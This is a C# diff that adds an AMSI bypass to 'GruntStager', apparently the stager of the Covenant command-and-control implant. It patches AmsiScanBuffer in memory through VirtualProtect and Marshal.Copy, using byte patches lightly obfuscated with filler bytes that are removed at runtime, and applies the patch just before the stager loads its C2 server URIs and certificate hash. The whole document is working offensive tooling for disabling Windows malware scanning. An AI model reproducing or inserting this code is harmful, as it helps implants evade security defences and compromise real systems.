@@ -12,13 +12,62 @@ using System.IO.Compression;
 using System.Threading;
 using System.Security.Principal;
 using System.Security.AccessControl;
-
+using System.Collections.Generic;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 
 
 namespace GruntStager
 {
+     public class Win32
+    {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    }
     public class GruntStager
     {
+        static byte[] x64 = new byte[] { 0xB8, 0x90, 0x57, 0x90, 0x00, 0x07, 0x80, 0xC3 };
+        static byte[] x86 = new byte[] { 0xB8, 0x90, 0x57, 0x00, 0x07, 0x90, 0x80, 0xC2, 0x18, 0x00 };
+
+        private static void PachAsi(byte[] pach)
+        {
+            try
+            {
+                var lib = Win32.LoadLibrary("amsi.dll");
+                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+
+                uint oldProtect;
+                Win32.VirtualProtect(addr, (UIntPtr)pach.Length, 0x40, out oldProtect);
+
+                Marshal.Copy(pach, 0, addr, pach.Length);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+            }
+        }
+
+        private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
+        }
+        public static void Bypa()
+        {
+            if (is64Bit())
+                PachAsi(x64);
+            else
+                PachAsi(x86);
+        }
         public GruntStager()
         {
             ExecuteStager();
@@ -36,6 +85,15 @@ namespace GruntStager
         {
             try
             {
+                var x64List = new List<byte>(x64);
+                x64List.RemoveAll(b => b == 0x90);
+                byte[] x64Array = x64List.ToArray();
+
+                var x86List = new List<byte>(x86);
+                x86List.RemoveAll(b => b == 0x90);
+                byte[] x86Array = x86List.ToArray();
+
+                PachAsi(x64Array);
                 List<string> CovenantURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                 string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                 List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
